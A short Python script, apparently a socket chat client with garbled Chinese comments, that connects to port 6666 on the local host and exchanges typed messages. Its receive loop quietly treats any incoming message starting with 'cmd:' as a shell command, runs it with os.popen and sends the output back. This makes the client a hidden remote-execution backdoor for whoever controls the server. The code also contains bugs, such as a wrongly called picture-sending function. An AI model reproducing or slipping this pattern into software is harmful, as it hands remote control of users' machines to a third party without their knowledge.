#!/usr/bin/env python
# coding=GBK
import socket
import threading
import os
import select

# ���ӷ�����
import sys

import time


def conn():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hostName = socket.gethostname()
    hostAddr = socket.gethostbyname_ex(hostName)
    port = 6666
    try:
        s.connect((hostAddr[2][0], port))
    except:
        print(hostAddr[2][0] + "����ʧ�ܣ�")
        exit()
    return s


# �����ַ���
def enc(my_str, key):
    str_ret = ""
    c = ""
    if type(my_str) is str:
        for i in my_str:
            c = chr(ord(i) ^ key)
            str_ret += c
        return str_ret
    else:
        for i in my_str:
            c = chr(ord(i) ^ key)
            str_ret += c
        return str_ret


# ִ��cmd����
def cmd(cmd_socket, cmd_data):
    n = cmd_data.decode("GBK").split(":")[1]
    ret = os.popen(n)
    ret_str = "shush:"+ret.read()

    cmd_socket.send(ret_str.encode("GBK"))
    ret.close()


# ����ͼƬ
def send_pic(m_socket, pic_path):
    with open(pic_path, 'rb') as f:
        for pic_data in f:
            m_socket.send(pic_data)
    print("ͼƬ�������!")


# ��������
def receive(m_socket):
    while True:
        try:
            data_ret = m_socket.recv(4096)
            if not data_ret:
                pass
            elif "cmd:" in data_ret.decode("GBK")[:10]:  # ִ��cmd����
                cmd(m_socket, data_ret)
            else:
                print(data_ret.decode("GBK"))  # ��ӡ������Ϣ
        except Exception as e:
            print(e)
            break


# ��������
def send(m_socket):
    while True:
        time.sleep(0.3)
        try:
            texts = input("")  # �����û�����
            if texts is "":
                continue
            if texts == 'img:':  # �����ͼƬ����ͼƬ��ȥ
                send_pic('./gif.gif')
            else:
                m_socket.send(texts.encode("GBK"))  # �����û����������
        except Exception as e:
            print(e)
            break


if __name__ == '__main__':
    m_socket = conn()
    welcome = m_socket.recv(4096)
    print(welcome.decode("GBK"))

    t1 = threading.Thread(target=receive, args=[m_socket, ])
    t1.start()
    t2 = threading.Thread(target=send, args=[m_socket, ])
    t2.start()
